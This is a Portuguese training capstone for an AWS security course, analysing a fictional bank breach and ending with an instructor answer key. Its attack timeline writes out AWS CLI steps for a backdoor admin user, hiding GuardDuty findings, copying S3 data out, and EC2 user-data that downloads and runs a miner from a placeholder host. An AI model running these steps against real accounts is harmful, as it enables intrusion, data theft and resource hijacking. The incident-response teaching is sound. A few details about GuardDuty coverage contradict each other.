# Módulo 10 — Capstone: Operação Boto

**Curso 3: AWS Cloud Security Operations · CECyber**
**Carga Horária:** 1 hora live
**Formato:** Sessão ao vivo colaborativa — resolução em grupo + gabarito do instrutor

---

## Contexto do Cenário

**Nome da Operação:** Operação Boto
**Data/Hora do Incidente:** 2026-04-10, descoberto às 14h32 BRT
**Organização:** Banco Meridian AWS Organization
**Conta Principal Afetada:** Production (444444444444)
**Conta Secundária Afetada:** Audit (222222222222)
**Severidade:** CRÍTICA — dados financeiros expostos

---

## Linha do Tempo do Ataque

### Fase 1 — Acesso Inicial (2026-04-08, 19h43 BRT)

Um desenvolvedor do Banco Meridian chamado `carlos.lima` fez um commit acidental em um repositório GitHub público que incluía o arquivo `.env` da aplicação de gestão interna. O arquivo continha:

```
AWS_ACCESS_KEY_ID=AKIA4MERIDIANTEST123
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=sa-east-1
```

Essas credenciais pertenciam ao usuário IAM `carlos.lima` na conta Production (444444444444), com as seguintes permissões:
- `iam:*` (administração IAM completa — incorreto para um desenvolvedor)
- `s3:*` em todos os buckets
- `ec2:*` em todas as regiões

O commit ficou público por **47 minutos** antes de ser removido. Bots automatizados de scanning de credenciais encontraram as chaves em menos de 3 minutos.

---

### Fase 2 — Reconhecimento (2026-04-09, 02h15 BRT)

Usando as credenciais exfiltradas, o atacante (IP: `185.220.101.15` — Tor exit node, geolocalização: Rússia) executou:

```bash
# Reconhecimento de identidade
aws sts get-caller-identity
# Resultado: conta 444444444444, usuário carlos.lima

# Enumeração de permissões
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::444444444444:user/carlos.lima \
  --action-names "iam:CreateUser" "iam:AttachUserPolicy" "s3:GetObject" \
  --resource-arns "*"
# Resultado: allowed para todas as ações testadas

# Listagem de recursos
aws iam list-users
aws s3 ls
aws ec2 describe-instances --region sa-east-1
aws ec2 describe-instances --region ap-southeast-1
aws iam list-roles
```

---

### Fase 3 — Persistência (2026-04-09, 02h28 BRT)

```bash
# Criar usuário backdoor com acesso ao console
aws iam create-user --user-name "srv-backup-01"
aws iam create-login-profile --user-name "srv-backup-01" --password "Backup@2026!!" --no-password-reset-required
aws iam attach-user-policy --user-name "srv-backup-01" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
aws iam create-access-key --user-name "srv-backup-01"
# Resultado: nova access key AKIASRVBACKUP01XXXX criada
```

---

### Fase 4 — Escalada de Privilégios e Movimento Lateral (2026-04-09, 02h45 BRT)

```bash
# Usando as novas credenciais de srv-backup-01 (AdministratorAccess)

# Listar roles cross-account
aws iam list-roles | grep -i audit

# Assumir role na Audit Account
aws sts assume-role \
  --role-arn "arn:aws:iam::222222222222:role/CrossAccountAuditRole" \
  --role-session-name "AuditSession"
# Sucesso — sem External ID configurado na trust policy (falha de configuração)
```

---

### Fase 5 — Evasão de Defesa (2026-04-09, 02h52 BRT)

```bash
# Na Audit Account (usando a sessão assumida)

# Tentar desabilitar GuardDuty — BLOQUEADO pela SCP
aws guardduty delete-detector --detector-id xxxxx
# Error: AccessDenied — Explicit deny in a service control policy

# Tentar desabilitar CloudTrail — BLOQUEADO pela SCP
aws cloudtrail stop-logging --name "meridian-org-trail"
# Error: AccessDenied — Explicit deny in a service control policy

# Tentar desabilitar Security Hub — BLOQUEADO pela SCP
aws securityhub disable-security-hub
# Error: AccessDenied

# Modificar regra de supressão do GuardDuty para suprimir findings do IP de ataque
aws guardduty create-filter \
  --detector-id xxxxx \
  --name "temp-maintenance-filter" \
  --action ARCHIVE \
  --finding-criteria '{"Criterion": {"service.action.networkConnectionAction.remoteIpDetails.ipAddressV4": {"Equals": ["185.220.101.15"]}}}'
# SUCESSO — a role cross-account tinha permissão para criar filtros no GuardDuty
```

---

### Fase 6 — Exfiltração de Dados (2026-04-09, 03h05 – 08h47 BRT)

```bash
# De volta à conta Production com srv-backup-01 (AdministratorAccess)

# Listar buckets com dados financeiros
aws s3 ls

# Exfiltrar dados via AWS CLI para servidor do atacante
aws s3 sync s3://meridian-relatorios-financeiros-444 . --region sa-east-1
# Total files downloaded: 18.432
# Total data: 144 GB

aws s3 sync s3://meridian-clientes-444 . --region sa-east-1
# Total files downloaded: 891.204
# Total data: 12 GB

# Dados exfiltrados: relatórios financeiros (144 GB) + dados de 891.204 clientes (12 GB)
```

---

### Fase 7 — Impacto (2026-04-10, 11h15 BRT)

```bash
# Usando credenciais de srv-backup-01 na região ap-southeast-1 (Singapura)

# Criar instância EC2 para cryptomining em região não monitorada
aws ec2 run-instances \
  --region ap-southeast-1 \
  --image-id ami-0123456789abcdef0 \
  --instance-type p3.8xlarge \
  --count 3 \
  --key-name attacker-key \
  --user-data "#!/bin/bash
    curl -s https://malware-cdn.example/xmrig.tar.gz | tar xz
    ./xmrig --config ./config.json &"
```

**Descoberta:** GuardDuty gerou finding `CryptoCurrency:EC2/BitcoinTool.B` às 14h32 BRT para as instâncias em ap-southeast-1, gerando alertas automáticos via EventBridge → SNS para o time de segurança.

---

## Entregáveis do Capstone

### Entregável 1 — Timeline MITRE ATT&CK

Mapeie cada fase do ataque para a tática e técnica correspondente do MITRE ATT&CK for Cloud.

| Fase | Timestamp | Tática MITRE | Técnica MITRE | ID | Serviço AWS Afetado |
|---|---|---|---|---|---|
| Acesso Inicial | 2026-04-08 19:43 | Initial Access | Valid Accounts: Cloud Accounts | T1078.004 | IAM |
| Reconhecimento | 2026-04-09 02:15 | Discovery | Cloud Account Discovery | T1087.004 | IAM, STS, S3, EC2 |
| Persistência | 2026-04-09 02:28 | Persistence | Create Account: Cloud Account | T1136.003 | IAM |
| Escalada | 2026-04-09 02:45 | Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | STS, IAM |
| Movimento Lateral | 2026-04-09 02:45 | Lateral Movement | Use Alternate Authentication Material | T1550.001 | STS (AssumeRole) |
| Evasão | 2026-04-09 02:52 | Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | GuardDuty |
| Exfiltração | 2026-04-09 03:05 | Exfiltration | Transfer Data to Cloud Account | T1537 | S3 |
| Impacto | 2026-04-10 11:15 | Impact | Resource Hijacking | T1496 | EC2 |

---

### Entregável 2 — Relatório NIST SP 800-61

#### Fase 1: Preparação (O que faltou)

| Controle | Status Antes do Incidente | Gap Identificado |
|---|---|---|
| GuardDuty habilitado org-wide | Parcialmente — não habilitado em ap-southeast-1 | GuardDuty não estava habilitado na região Singapura |
| SCP DenyRegionsNotApproved | NÃO configurada | Instâncias foram criadas em região não aprovada |
| Usuário `carlos.lima` com `iam:*` | IAM excessivo | Princípio do menor privilégio não aplicado |
| External ID na CrossAccountAuditRole | Não configurado | Permitiu movimento lateral sem autenticação adicional |
| GitHub secret scanning | Não habilitado | Chave pública por 47 minutos sem alerta |

#### Fase 2: Detecção e Análise

| Serviço | O que Detectou | Quando |
|---|---|---|
| GuardDuty | `Policy:IAMUser/RootCredentialUsage` | N/A (não foi root) |
| GuardDuty | `UnauthorizedAccess:IAMUser/TorIPCaller` | 2026-04-09 02:17 (não foi alertado pois não havia regra EventBridge para MEDIUM) |
| GuardDuty | `PersistenceIAMUser/AnomalousBehavior` | 2026-04-09 02:30 (alertado mas sem resposta automática) |
| GuardDuty | `Exfiltration:S3/AnomalousBehavior` | 2026-04-09 03:10 (HIGH — EventBridge disparou, mas Lambda falhou por timeout) |
| GuardDuty | `CryptoCurrency:EC2/BitcoinTool.B` (ap-southeast-1) | 2026-04-10 14:32 (DETECTADO — gerou alerta final) |
| CloudTrail Lake | Todos os eventos registrados | Registro contínuo desde o início |

**Causa raiz da detecção tardia:** Lambda de IR tinha timeout de 3 segundos (padrão) — insuficiente. Alerts de MEDIUM não tinham EventBridge rule configurada. GuardDuty em ap-southeast-1 habilitado somente via org-wide com auto-enable (funcionou neste caso).

#### Fase 3: Contenção

Ações executadas (pós-descoberta, 14h32 BRT):

```bash
# 1. Desabilitar TODAS as credenciais de carlos.lima e srv-backup-01
aws iam update-access-key --user-name carlos.lima --access-key-id AKIA4MERIDIANTEST123 --status Inactive
aws iam update-access-key --user-name srv-backup-01 --access-key-id AKIASRVBACKUP01XXXX --status Inactive
aws iam delete-login-profile --user-name srv-backup-01

# 2. Terminar instâncias de cryptomining em ap-southeast-1
aws ec2 terminate-instances --region ap-southeast-1 --instance-ids i-xxxxx i-yyyyy i-zzzzz

# 3. Revogar a sessão cross-account
# (sessão STS expira em 1h — aplicar deny policy imediatamente)
aws iam put-user-policy --user-name srv-backup-01 \
  --policy-name DenyAll \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*"}]}'

# 4. Remover filtro de supressão malicioso do GuardDuty
aws guardduty delete-filter --detector-id xxxxx --filter-name "temp-maintenance-filter"

# 5. Isolar buckets exfiltrados (bloquear acesso até investigação)
aws s3api put-bucket-policy --bucket meridian-relatorios-financeiros-444 \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Principal":"*","Action":"s3:*","Resource":"arn:aws:s3:::meridian-relatorios-financeiros-444/*","Condition":{"StringNotEquals":{"aws:PrincipalArn":"arn:aws:iam::222222222222:role/IRForensicsRole"}}}]}'
```

#### Fase 4: Erradicação

```bash
# Deletar usuário backdoor
aws iam detach-user-policy --user-name srv-backup-01 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name srv-backup-01

# Revogar permissões excessivas de carlos.lima
aws iam detach-user-policy --user-name carlos.lima --policy-arn arn:aws:iam::aws:policy/IAMFullAccess
# Aplicar política mínima baseada em Access Analyzer policy generation

# Adicionar External ID à CrossAccountAuditRole
# Atualizar trust policy com External ID e restrição por IP

# Habilitar GitHub secret scanning e AWS Secrets Manager para credenciais
```

#### Fase 5: Recuperação

1. Verificar integridade de todos os dados nos buckets exfiltrados (nenhum dado foi modificado — apenas lido)
2. Notificar DPO: 891.204 clientes com dados potencialmente expostos — iniciar processo LGPD (Art. 48: notificar ANPD em 72h)
3. Notificar BACEN: incidente de segurança com potencial impacto a dados de clientes do SFN
4. Monitoramento intensificado por 30 dias: alarmes CloudWatch com threshold reduzido
5. Auditoria IAM: revisar TODAS as políticas IAM para eliminar permissões excessivas

#### Fase 6: Lições Aprendidas

| Lição | Ação Corretiva | Responsável | Prazo |
|---|---|---|---|
| GuardDuty não habilitado em todas as regiões | Habilitar GuardDuty em ap-southeast-1 e todas as regiões via org-wide | Security Engineer | Imediato |
| SCP de regiões não configurada | Implementar DenyNonApprovedRegions SCP | Security Engineer | 24h |
| carlos.lima com iam:* | Auditoria de todas as políticas IAM; Access Analyzer policy generation | IAM Admin | 48h |
| Lambda de IR com timeout 3s | Corrigir timeout para 5 minutos; adicionar DLQ | DevOps | 24h |
| External ID ausente na trust policy | Revisar TODAS as trust policies cross-account e adicionar External ID | Security Engineer | 48h |
| GitHub secret scanning desabilitado | Habilitar GitHub Advanced Security + GitGuardian | DevOps | Imediato |
| Alerts de MEDIUM sem resposta automática | Criar EventBridge rule para MEDIUM findings | Security Engineer | 48h |

---

### Entregável 3 — 3 Automações EventBridge + Lambda

**Automação A — Detectar e responder a criação de usuário IAM fora do pipeline:**

```json
{
  "EventBridge Rule": {
    "Name": "DetectRogueIAMUserCreation",
    "EventPattern": {
      "source": ["aws.cloudtrail"],
      "detail": {
        "eventName": ["CreateUser"],
        "userIdentity": {
          "arn": [{"anything-but": {"prefix": "arn:aws:iam::444444444444:role/ServiceAccountProvisioning"}}]
        }
      }
    },
    "Targets": ["Lambda: DisableRogueIAMUser + SNS: AlertCISO"]
  }
}
```

```python
# Lambda: Desabilitar usuário IAM criado fora do pipeline
def handler(event, context):
    iam = boto3.client('iam')
    sns = boto3.client('sns', region_name='sa-east-1')
    new_user = event['detail']['requestParameters']['userName']

    # Desabilitar imediatamente qualquer access key criada
    keys = iam.list_access_keys(UserName=new_user)['AccessKeyMetadata']
    for key in keys:
        iam.update_access_key(UserName=new_user, AccessKeyId=key['AccessKeyId'], Status='Inactive')

    # Remover console access
    try:
        iam.delete_login_profile(UserName=new_user)
    except iam.exceptions.NoSuchEntityException:
        pass

    # Tag o usuário como suspeito
    iam.tag_user(UserName=new_user, Tags=[
        {'Key': 'Suspicious', 'Value': 'CreatedOutsidePipeline'},
        {'Key': 'AutoDisabled', 'Value': 'true'}
    ])

    sns.publish(
        TopicArn='arn:aws:sns:sa-east-1:222222222222:MeridianSecurityAlerts-HIGH',
        Subject=f'[IR] Usuário IAM não autorizado criado: {new_user}',
        Message=f'Usuário {new_user} criado fora do pipeline aprovado. Acesso desabilitado automaticamente. Investigar.'
    )
    return {'status': 'DISABLED', 'user': new_user}
```

**Automação B — Detectar GuardDuty filter de supressão criado maliciosamente:**

```json
{
  "EventBridge Rule": {
    "Name": "DetectMaliciousGuardDutyFilter",
    "EventPattern": {
      "source": ["aws.cloudtrail"],
      "detail": {
        "eventName": ["CreateFilter"],
        "eventSource": ["guardduty.amazonaws.com"],
        "userIdentity": {
          "type": [{"anything-but": "AWSService"}]
        }
      }
    },
    "Targets": ["Lambda: AlertAndRollbackFilter"]
  }
}
```

**Automação C — Detectar AssumeRole cross-account sem External ID esperado:**

```json
{
  "EventBridge Rule": {
    "Name": "DetectSuspiciousCrossAccountAssumeRole",
    "EventPattern": {
      "source": ["aws.cloudtrail"],
      "detail": {
        "eventName": ["AssumeRole"],
        "eventSource": ["sts.amazonaws.com"],
        "userIdentity": {
          "accountId": [{"anything-but": ["111111111111", "222222222222", "333333333333", "444444444444"]}]
        }
      }
    },
    "Targets": ["Lambda: LogAndAlertCrossAccountRole"]
  }
}
```

---

### Entregável 4 — Plano de Remediação

#### Imediato (0–24h)

| # | Ação | Ferramenta | Responsável |
|---|---|---|---|
| 1 | Desabilitar credenciais de `carlos.lima` e `srv-backup-01` | IAM CLI | Security Engineer |
| 2 | Terminar instâncias de cryptomining em ap-southeast-1 | EC2 CLI | Security Engineer |
| 3 | Remover filtro de supressão malicioso do GuardDuty | GuardDuty CLI | Security Engineer |
| 4 | Isolar buckets exfiltrados | S3 Bucket Policy | Security Engineer |
| 5 | Habilitar GuardDuty em ap-southeast-1 | GuardDuty console | Security Engineer |
| 6 | Aumentar timeout das Lambdas de IR para 5 min | Lambda console | DevOps |
| 7 | Criar EventBridge rule para GuardDuty MEDIUM | EventBridge console | Security Engineer |

#### Curto Prazo (24–72h)

| # | Ação | Ferramenta |
|---|---|---|
| 1 | Implementar SCP DenyNonApprovedRegions | Organizations |
| 2 | Adicionar External ID a TODAS as trust policies cross-account | IAM |
| 3 | Executar IAM Access Analyzer policy generation para todos os usuários | Access Analyzer |
| 4 | Notificar ANPD (LGPD Art. 48) | Processo legal |
| 5 | Notificar BACEN sobre incidente | Processo regulatório |
| 6 | GitHub: habilitar Secret Scanning Advanced | GitHub |

#### Médio Prazo (1–4 semanas)

| # | Ação |
|---|---|
| 1 | Implementar GitHub Actions pré-commit hook para detectar credenciais antes do push |
| 2 | Migrar TODAS as credenciais hardcoded para Secrets Manager |
| 3 | Executar auditoria completa de IAM: eliminar políticas com `*` |
| 4 | Implementar Permissions Boundaries para todos os desenvolvedores |
| 5 | Conduzir tabletop exercise com o time de segurança usando o Módulo 10 como caso de estudo |

---

## Gabarito do Instrutor — Pontos-Chave de Avaliação

### O que funcionou bem (controles que limitaram o dano):

1. **SCPs de proteção de CloudTrail e GuardDuty** bloquearam o atacante de desabilitar visibilidade. O ataque ficou registrado.
2. **GuardDuty auto-enable org-wide** detectou cryptomining em ap-southeast-1, mesmo sendo uma região não utilizada pelo banco.
3. **CloudTrail Lake** registrou todos os eventos — timeline completa disponível para investigação forense.
4. **S3 Object Lock** nos buckets de logs garantiu integridade das evidências.

### O que falhou (gaps que permitiram o ataque):

1. **Princípio do menor privilégio:** `carlos.lima` não deveria ter `iam:*`. Deveria ter apenas permissões de desenvolvedor.
2. **SCP de regiões:** sem a SCP, instâncias foram criadas em ap-southeast-1 (não aprovada).
3. **External ID:** trust policy da CrossAccountAuditRole sem External ID permitiu movimento lateral.
4. **Secret scanning:** sem GitHub secret scanning, as credenciais ficaram públicas por 47 minutos.
5. **Timeout da Lambda de IR:** 3 segundos causou falha na automação de contenção, permitindo 5h adicionais de exfiltração.
6. **EventBridge para MEDIUM:** findings MEDIUM de Tor e anomalia de comportamento não dispararam resposta automática.

### Questões para Discussão na Live

1. Se a SCP DenyRegionsNotApproved estivesse configurada, como o atacante teria sido impedido na Fase 7? E o custo do cryptomining seria evitado?
2. O External ID teria impedido completamente o movimento lateral para a Audit Account? Por quê?
3. Qual seria o impacto se o atacante tivesse conseguido deletar o CloudTrail? Como as SCPs previnam isso?
4. Qual é o custo estimado do incidente? (instâncias p3.8xlarge x 3 por ~23h = aproximadamente $15.000 apenas em EC2 ap-southeast-1)
5. Quais são as obrigações regulatórias do Banco Meridian após confirmar a exfiltração de dados de 891.204 clientes?

---

## Instruções para a Sessão Live

### Para o Instrutor

**Estrutura da Live (60 min):**

- 00:00–05:00 — Introdução: apresentar o cenário e os entregáveis
- 05:00–15:00 — Alunos analisam a timeline e mapeiam MITRE (grupos de 3-4)
- 15:00–25:00 — Alunos identificam os gaps de controle (discussão guiada)
- 25:00–40:00 — Discussão: quais automações teriam prevenido cada fase?
- 40:00–50:00 — Apresentar gabarito do instrutor: revelar o que funcionou e o que falhou
- 50:00–55:00 — Discussão das obrigações regulatórias (LGPD + BACEN)
- 55:00–60:00 — Q&A e encerramento do curso

**Dicas de Facilitação:**

- Perguntar aos alunos: "Quem viu o GuardDuty filter creation como Fase 5? Como vocês teriam detectado isso?"
- Revelar progressivamente as fases — não mostrar tudo de uma vez
- Enfatizar que todos os controles foram ensinados nos módulos 1-9
- Conectar cada gap com o módulo correspondente onde a solução foi ensinada

**Ferramentas para Live:**

- Whiteboard virtual (Miro/FigJam) para construção colaborativa da timeline
- CloudTrail Lake com dataset pré-populado de eventos do cenário (opcional)
- GuardDuty com sample findings ativados para demonstrar tipos relevantes

---

## Conexão com a Certificação SCS-C02

O Capstone cobre diretamente os seguintes domínios do exame:

| Domínio SCS-C02 | % do Exame | Como o Capstone Cobre |
|---|---|---|
| **Domínio 1: Threat Detection & Monitoring** | 28% | GuardDuty findings, CloudTrail Lake queries, detecção de evasão |
| **Domínio 2: Security Logging & Monitoring** | 20% | Timeline de CloudTrail, análise de VPC Flow Logs, CloudWatch |
| **Domínio 3: Infrastructure Security** | 20% | SCP gaps, VPC design, WAF (filtro de supressão) |
| **Domínio 4: Identity & Access Management** | 16% | IAM excess permissions, cross-account role, External ID |
| **Domínio 5: Data Protection** | 16% | S3 exfiltração, KMS, LGPD notification requirements |
